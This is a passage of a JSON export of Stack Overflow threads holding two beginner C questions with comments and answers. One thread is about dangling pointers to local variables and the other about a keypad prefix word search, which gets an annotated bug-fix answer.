"score": 7, "creation_date": 1542208235, "post_id": 53303181, "comment_id": 93487357, "body": "The variables in <code>populateSides</code> are local and go out of scope when the function returns. You have dangling pointers in <code>sides</code> -&gt; dereferencing them invokes <i>undefined behavior</i>"}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 1, "creation_date": 1542208317, "post_id": 53303181, "comment_id": 93487416, "body": "Why not just use <code>int sides[3];</code>? You won&#39;t have these issues."}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "reply_to_user": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1542208451, "post_id": 53303181, "comment_id": 93487486, "body": "@JohnnyMopp for some reason our teacher wanted us to use an array of pointers to int..."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542208505, "post_id": 53303181, "comment_id": 93487524, "body": "You can make the variables a, b, c <code>static</code> and it will solve the bug. But it&#39;s still a very ugly way to write a program."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1542208565, "post_id": 53303181, "comment_id": 93487548, "body": "Unrelated to your problem, but there is no need for the leading space in the <code>scanf()</code> format strings. <code>%d</code> already ignores leading whitespace characters; the only <code>scanf()</code> directives that do not ignore leading whitespace characters are <code>%c</code>, <code>%n</code>, and <code>%[]</code>. Also, and more importantly, you should be checking the value returned by the calls to <code>scanf()</code> to verify that input is as expected."}, {"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542208571, "post_id": 53303181, "comment_id": 93487551, "body": "<code>sides[0] = &amp;a;</code> is assigning the address of a local variable to <code>sides[0]</code>. That cannot be correct."}, {"owner": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 0, "creation_date": 1542208608, "post_id": 53303181, "comment_id": 93487571, "body": "Absolutely do <i>not</i> make the variables <code>static</code>. You may need to seek clarification from your teacher, as the method currently shown is <i>not</i> the best way to accomplish this. It would be much better to pass in an array of <code>int</code>s (not an array of pointers) and directly store the <code>scanf()</code> conversion output in that array."}, {"owner": {"reputation": 1189, "user_id": 9232218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb7ced53adbb0ba08d1cea65a43b124d?s=128&d=identicon&r=PG&f=1", "display_name": "Yastanub", "link": "https://stackoverflow.com/users/9232218/yastanub"}, "edited": false, "score": 0, "creation_date": 1542208736, "post_id": 53303181, "comment_id": 93487645, "body": "If you are forced to use an array of pointers (please ask your teacher again maybe you misunderstood) you needed to allocate memory for every entry in <code>sides</code> first with <code>malloc</code> and then just <code>scanf</code> the values directly into the array."}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "reply_to_user": {"reputation": 15800, "user_id": 1274314, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/gSYsp.jpg?s=128&g=1", "display_name": "TypeIA", "link": "https://stackoverflow.com/users/1274314/typeia"}, "edited": false, "score": 0, "creation_date": 1542208744, "post_id": 53303181, "comment_id": 93487649, "body": "@TypeIA multiple students did but he was adamant that we should use <code>int *[]</code> instead of a simple <code>int []</code>  . Can&#39;t tell why to be honest"}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "reply_to_user": {"reputation": 1189, "user_id": 9232218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb7ced53adbb0ba08d1cea65a43b124d?s=128&d=identicon&r=PG&f=1", "display_name": "Yastanub", "link": "https://stackoverflow.com/users/9232218/yastanub"}, "edited": false, "score": 0, "creation_date": 1542208816, "post_id": 53303181, "comment_id": 93487686, "body": "@Yastanub i tried doing that when i first got started but was lost on how to cast the <code>int</code> &#232;ach pointer was pointing at , to a  <code>double</code>. Should i go back to trying and figure out that?"}, {"owner": {"reputation": 1189, "user_id": 9232218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb7ced53adbb0ba08d1cea65a43b124d?s=128&d=identicon&r=PG&f=1", "display_name": "Yastanub", "link": "https://stackoverflow.com/users/9232218/yastanub"}, "edited": false, "score": 0, "creation_date": 1542209024, "post_id": 53303181, "comment_id": 93487796, "body": "Just as you already did. The only difference would be to not assign the addresses of the local variables, but rather allocate the memory yourself with <code>malloc</code>"}, {"owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "reply_to_user": {"reputation": 1189, "user_id": 9232218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb7ced53adbb0ba08d1cea65a43b124d?s=128&d=identicon&r=PG&f=1", "display_name": "Yastanub", "link": "https://stackoverflow.com/users/9232218/yastanub"}, "edited": false, "score": 0, "creation_date": 1542209092, "post_id": 53303181, "comment_id": 93487829, "body": "@Yastanub my only concern on that would be that we were taught about <code>malloc</code> after we were given the exercises so i don&#39;t think we are &quot;allowed&quot; to use it. Can&#39;t it be done without it?"}, {"owner": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "reply_to_user": {"reputation": 1189, "user_id": 9232218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb7ced53adbb0ba08d1cea65a43b124d?s=128&d=identicon&r=PG&f=1", "display_name": "Yastanub", "link": "https://stackoverflow.com/users/9232218/yastanub"}, "edited": false, "score": 0, "creation_date": 1542209197, "post_id": 53303181, "comment_id": 93487896, "body": "@Yastanub Can&#39;t the OP do <code>scanf(&quot; %d&quot;, sides[0]);</code> since <code>sides[0]</code> is an address ?"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 103, "user_id": 8057767, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2a4630a9a0a0606a00b1867ab9252cb?s=128&d=identicon&r=PG&f=1", "display_name": "luci88filter", "link": "https://stackoverflow.com/users/8057767/luci88filter"}, "edited": false, "score": 0, "creation_date": 1542209290, "post_id": 53303181, "comment_id": 93487961, "body": "@luci88filter It needs to be initialized to point to valid memory. Therefore you need <code>malloc</code>."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1542209697, "post_id": 53303181, "comment_id": 93488191, "body": "@Osiris -- &quot;Therefore you need <code>malloc</code>&quot;: Not necessarily. A simple <code>int a, b, c; sides[0] = &amp;a; sides[1] = &amp;b; sides[2] = &amp;c;</code> in <code>main()</code> would suffice. Or <code>int nums[3]; for (size_t i = 0; i &lt; 3; i++) { sides[i] = &amp;nums[i]; }</code>"}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1542209780, "post_id": 53303181, "comment_id": 93488247, "body": "Here&#39;s 3 different ways: using <code>static</code>, using local vars in <code>main</code>, and using <code>malloc</code>. <a href=\"https://ideone.com/DSGuJb\" rel=\"nofollow noreferrer\">ideone.com/DSGuJb</a>"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1542210111, "post_id": 53303181, "comment_id": 93488468, "body": "@DavidBowling I was referring to the comment that suggested to use <code>malloc</code> and explained why you can&#39;t just write inside <code>sides[0]</code> just because it is an address. Of course there are other possibilities to point to valid memory."}], "owner": {"reputation": 506, "user_id": 6655405, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/oqJAE.png?s=128&g=1", "display_name": "Stelios Papamichail", "link": "https://stackoverflow.com/users/6655405/stelios-papamichail"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 75, "favorite_count": 0, "closed_date": 1542208371, "answer_count": 0, "score": 0, "last_activity_date": 1542208198, "creation_date": 1542207832, "last_edit_date": 1542208198, "question_id": 53303181, "link": "https://stackoverflow.com/questions/53303181/strange-casting-behavior", "closed_reason": "Duplicate", "title": "Strange casting behavior", "body": "<p>I have an array of <code>int *arr[3];</code> and its elements are initialized like this :</p>\n\n<pre><code>sides[0] = &amp;a;\nsides[1] = &amp;b;\nsides[2] = &amp;c;\n</code></pre>\n\n<p>Where a=b=5 and c=10. Now when i try to cast the type of the value (from int to double) of the contents of the memory address that each pointer is pointing at, the 3rd value shows up always as 0. Do you know why? </p>\n\n<p>Here's what i'm doing:</p>\n\n<pre><code>double a,b,c;\na = (double) *sides[0];\nb = (double) *sides[1];\nc = (double) *sides[2];\nprintf(\"%lf %lf %lf\",a,b,c);\n</code></pre>\n\n<p>The <code>output</code> i get is:</p>\n\n<pre><code>5.0000 5.0000 0.0000\n</code></pre>\n\n<p>Here's the full code:</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\nvoid populateSides(int *[3]);\nvoid calculateTriangleType(int *[3]);\n\n/*\n* Function populateSides: Has 1 arg\n* 1st arg: an array of int *.\n* This function stores the 3 sides of a triangle \n* given by the user into the sides array.\n*/\nvoid populateSides(int *sides[]) {\n    int i,a,b,c;\n    scanf(\" %d\",&amp;a);\n    scanf(\" %d\",&amp;b);\n    scanf(\" %d\",&amp;c);\n    while((c &lt;= b) || (c &lt;= a)) {\n        scanf(\" %d\",&amp;c);\n    }\n    sides[0] = &amp;a;\n    sides[1] = &amp;b;\n    sides[2] = &amp;c;\n}\n\n/*\n*/\nvoid calculateTriangleType(int *sides[]) {\n    double a,b,c;\n    a = (double) *sides[0];\n    b = (double) *sides[1];\n    c = (double) *sides[2];\n    printf(\"%lf %lf %lf\",a,b,c);\n\n}\n\nint main(void) { // Stelios Papamichail 4020\n    int *sides[3]; // stores each side of a triangle ( &gt;0)\n    populateSides(sides);\n    calculateTriangleType(sides);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "recursion", "prefix"], "comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 2, "creation_date": 1542207279, "post_id": 53302921, "comment_id": 93486661, "body": "I don&#39;t get it. Whats the relation of <code>72</code> to <code>&quot;pa&quot;</code>, <code>&quot;ra&quot;</code>, <code>&quot;sa&quot;</code>, and <code>&quot;sc&quot;</code>?"}, {"owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542207661, "post_id": 53302921, "comment_id": 93486941, "body": "I apologize, should&#39;ve been more clear. The numbers are based on the numbers on a keypad (see the top has a constant 2D char array, with each number having a value of letters. So the recursion searches through possibilities and then compares those to words in the file, otherwise it would return a mess of letter combinations that have no place in the english language. I will place a keypad in the post to clear things up. @Swordfish"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1542208145, "post_id": 53302921, "comment_id": 93487282, "body": "So you&#39;re essentially talking about <a href=\"https://en.wikipedia.org/wiki/T9_(predictive_text)\" rel=\"nofollow noreferrer\">T9 texting</a>?"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542208445, "post_id": 53302921, "comment_id": 93487483, "body": "That <code>fscanf(fp, &quot;%s&quot;</code> and <code>while (!feof(fp)</code> look bad, just use <code>while (fgets(str, 32, fp))</code>. So <code>isEqual</code> is recursively called from <code>printWordsUtil</code> with all the permutations obtained from <code>439</code> number? Your <code>startpre</code> once you know that <code>lenstr &gt; lenpre</code> you can just <code>memcmp(pre, str, lenpre) == 0</code> would save few cycles."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542236522, "post_id": 53302921, "comment_id": 93500861, "body": "When you start looking for efficient, fast, prefix searching, an optimal solution is a <a href=\"https://github.com/drankinatty/ternary_st\" rel=\"nofollow noreferrer\">Ternary Search Tree for Prefix-Search</a>. The examples there will use your <code>words_alpha.txt</code> loading all 370099 words in 0.176696 sec. You can then prefix search, e.g. finding all 275 words beginning with <code>&quot;zoo&quot;</code> in  0.000064 sec."}, {"owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542238226, "post_id": 53302921, "comment_id": 93501401, "body": "@DavidC.Rankin did you happen to create that algorithm?"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542238461, "post_id": 53302921, "comment_id": 93501475, "body": "No. I heard about the algorithm and was intrigued by the memory saving it allowed compared to a traditional TRIE tree. So I went looking for more information and examples -- there were very few. I could find a basic example on filling a ternary tree -- but no examples handled deletion properly. So the deletion rotation part of the algorithm is mine, but the concept of the ternary tree isn&#39;t."}], "answers": [{"comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1542237573, "post_id": 53306233, "comment_id": 93501201, "body": "Did you intent to not comment on <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\"><b>Why is while ( !feof (file) ) always wrong?</b></a>?"}, {"owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542238091, "post_id": 53306233, "comment_id": 93501360, "body": "@DavidC.Rankin hey again David!! Hope you&#39;re having a good day!"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1542238284, "post_id": 53306233, "comment_id": 93501418, "body": "Yep, day is going well. Keep at it, but don&#39;t rush There is a lot to digest. The approach to learning C is a lot like the approach to eating a whale -- you got to take it one bite (or byte) at a time <code>:)</code>"}, {"owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "edited": false, "score": 0, "creation_date": 1542238399, "post_id": 53306233, "comment_id": 93501451, "body": "@Craig-Estey, first I&#39;d like to thank you for finding those bugs and solving my issue... I wanted to ask why you use <code>#if</code> style instead of the standard syntax? I&#39;ve just never seen that before, thought it was pretty cool. Thanks again!"}, {"owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542238465, "post_id": 53306233, "comment_id": 93501477, "body": "@DavidC.Rankin haha you&#39;re quickly becoming an inspiration to me!"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1542238785, "post_id": 53306233, "comment_id": 93501576, "body": "The <code>#if #else #endif</code> (you will also see <code>#ifdef</code> (short for <code>#if defined</code>), etc..) which are <i>preprocessor</i> directives. In these cases they simply provide a way to choose which code to use at compile time by either setting a <code>#define</code> on the command line with <code>-DYOURTAG</code> or defining it in your code manually. So if I had alternate code that would execute <code>#ifdef YOURTAG</code>, I could pass <code>-DYOURTAG</code> as part of the compiler options to make that test true and include the code between <code>#ifdef YOURTAG ... #endif</code>. You will see that used in many sources."}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "reply_to_user": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "edited": false, "score": 1, "creation_date": 1542239018, "post_id": 53306233, "comment_id": 93501641, "body": "@user7823016 <code>#if 0</code> is a debugging thing [usually temporarily]. Wrapping code with <code>#if 0</code> to &quot;comment&quot; it out is better than doing <code>&#47;* ... some_code ... *&#47;</code>. I use it to nullify &quot;suspect&quot; code without actually removing it (e.g. the code <i>might</i> actually be correct which I find out later and I just do <code>#if 1</code>). When fully debugged, I clean up the <code>#if 0&#47;1</code> blocks. Here, I use <code>#if 0</code> to show <i>your</i> code vs. the corrected code (e.g. like the output of <code>diff</code> [sort of])"}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1542239874, "post_id": 53306233, "comment_id": 93501876, "body": "@DavidC.Rankin Hi, David. Actually, I saw the <code>feof</code> and was going comment on it and to edit it out. Usually, I post an annotated version [with minimal changes] and a cleaned up version [which has more style cleanups and refactoring]. Here, I was pressed for time, so I just did the first version. Since you&#39;ve posted the link [and properly admonished me :-)], I just updated the code to put <code>#if 0</code> around the <code>feof</code> code`"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1542240762, "post_id": 53306233, "comment_id": 93502104, "body": "Yes, I caught that. Always a good opportunity to point out &quot;Don&#39;t do that!&quot; to the questioner to make sure he (or she) doesn&#39;t continue to repeat the error. It was a good and helpful answer with the bonus of an introduction to preprocessor directives as well <code>:)</code>"}], "tags": [], "owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "is_accepted": true, "score": 2, "last_activity_date": 1542239501, "last_edit_date": 1542239501, "creation_date": 1542218365, "answer_id": 53306233, "question_id": 53302921, "link": "https://stackoverflow.com/questions/53302921/how-can-i-integrate-a-prefix-checker-to-find-complete-words-based-on-file-read/53306233#53306233", "title": "How can I integrate a prefix checker to find complete words based on file read", "body": "<p>There were a few bugs.</p>\n\n<p>Your prefix function was okay. The <code>strncmp</code> you replaced it with was not.</p>\n\n<p>You had a <code>break</code> on a hit that stopped on the <em>first</em> word match, so subsequent ones were not shown.</p>\n\n<p>On a hit you were printing the prefix string instead of the word string.</p>\n\n<p>I've annotated your code with the bugs and fixed them [please pardon the gratuitous style cleanup]:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdbool.h&gt;\n\nconst char numbered_letters[10][5] = { \"\", \"\", \"abc\", \"def\", \"ghi\", \"jkl\",\n    \"mno\", \"pqrs\", \"tuv\", \"wxyz\"\n};\n\nbool\nstartsWith(const char *pre, const char *str)\n{\n    size_t lenpre = strlen(pre),\n        lenstr = strlen(str);\n\n    return lenstr &lt; lenpre ? false : strncmp(pre, str, lenpre) == 0;\n}\n\nvoid\nisEqual(char input[])\n{\n    int i = 0;\n    int ilen = strlen(input);\n\n    // input[strlen(input)] = 0;\n// NOTE/BUG: this is extraneous\n#if 0\n    startsWith(input, input);\n#endif\n    printf(\"check:  '%s'\\n\", input);\n\n    // creating file\n    FILE *fp = fopen(\"words_alpha.txt\", \"r\");\n// NOTE/BUG: this needs to be one more to contain the nul terminater\n#if 0\n    /* Handles largest possible string in the list which is:\n        dichlorodiphenyltrichloroethane */\n    char str[32];\n#else\n    char str[33];\n#endif\n\n    // fseek(fp, 0, SEEK_SET);\n    if (fp == NULL) {\n        printf(\"Error! No file!\\n\");\n    }\n    else {\n        // printf(\"Enter a number to be converted into a word-list\");\n        // scanf(\"%s\", str);\n\n// NOTE/BUG: although feof works here, it is considered _bad_ practice\n#if 0\n        while (!feof(fp)) {\n            fscanf(fp, \"%s\", str);\n#else\n        while (1) {\n            if (fscanf(fp, \"%s\", str) != 1)\n                break;\n#endif\n\n// NOTE/BUG: this is broken\n#if 0\n            i = strncmp(input, str, 32) == 0;\n#endif\n// NOTE: this works and is simpler than startsWith (which also works)\n#if 0\n            i = strncmp(input, str, ilen) == 0;\n#endif\n#if 1\n            i = startsWith(input, str);\n#endif\n\n            if (i) {\n// NOTE/BUG: we want the actual word to be printed and not just the prefix\n#if 0\n                printf(\"HIT:    %s\\n\", input);\n#else\n                printf(\"HIT:    %s\\n\", str);\n#endif\n// NOTE/BUG: this break stops on the _first_ word match in the list but we\n// want all of them\n#if 0\n                break;\n#endif\n            }\n            else {\n                //printf(\"\");\n            }\n            // if (strncmp(str, \"hello\", 32 ) == 0) { /*if strncmp finds the word and returns true, print */\n            // printf(\"%s\\n\", str);\n\n        }\n        // printf(\"%s\\n\", str);\n        // compareNums(num);\n    }\n    fclose(fp);\n}\n\nvoid\nprintWordsUtil(int numbers[], int curr_digit, char output[], int n)\n{\n\n    // Base case, if current output word is prepared\n    int i;\n\n    if (curr_digit == n) {\n        // printf(\"%s \", output);\n        isEqual(output);\n        return;\n    }\n\n// NOTE: did some cleanup to understand what was going on -- [probably] not a\n// bug\n    int numcur = numbers[curr_digit];\n    const char *letters = numbered_letters[numcur];\n    int letlen = strlen(letters);\n\n    // Try all possible characters for current digit in number[]\n    // and recur for remaining digits\n    for (i = 0; i &lt; letlen; ++i) {\n        output[curr_digit] = letters[i];\n        printWordsUtil(numbers, curr_digit + 1, output, n); /* recursive call */\n        if ((numcur == 0) || (numcur == 1))\n            break;\n    }\n}\n\n// A wrapper over printWordsUtil().  It creates an output array and\n// calls printWordsUtil()\nvoid\nprintWords(int number[], int n)\n{\n    char result[n + 1];\n\n// NOTE/BUG: this will have garbage in elements 0 to (n - 1)\n// NOTE/BUG: result is not used otherwise\n    result[n] = '\\0';\n\n    printWordsUtil(number, 0, result, n);\n\n}\n\n//Driver program\nint\nmain(void)\n{\n    int number[] = { 4, 3, 9 };\n    int n = sizeof(number) / sizeof(number[0]);\n\n    printWords(number, n);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 65, "user_id": 7823016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca82d2a4a4901c9bbae905ff4e928ddf?s=128&d=identicon&r=PG&f=1", "display_name": "user7823016", "link": "https://stackoverflow.com/users/7823016/user7823016"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 53306233, "answer_count": 1, "score": 1, "last_activity_date": 1542239501, "creation_date": 1542206971, "last_edit_date": 1542207768, "question_id": 53302921, "link": "https://stackoverflow.com/questions/53302921/how-can-i-integrate-a-prefix-checker-to-find-complete-words-based-on-file-read", "title": "How can I integrate a prefix checker to find complete words based on file read", "body": "<p><strong>ISSUE:</strong> I'm able to search through the file and print words based on numbers entered by the user (text-message number conversion), buy I should also be able to find full words based on only a portion of the numbers entered, so ... <code>72</code> would return pa, ra, sa, and sc... which would find words in my file such as <code>party</code>, <code>radio</code>, <code>sandwich</code>, and <code>scanner</code>.</p>\n\n<p>I've tried utilizing prefix functions, but I'm unable to integrate them properly. The <code>startsWith</code> function is an example. </p>\n\n<p>The words are based on a numbered keypad such as: <a 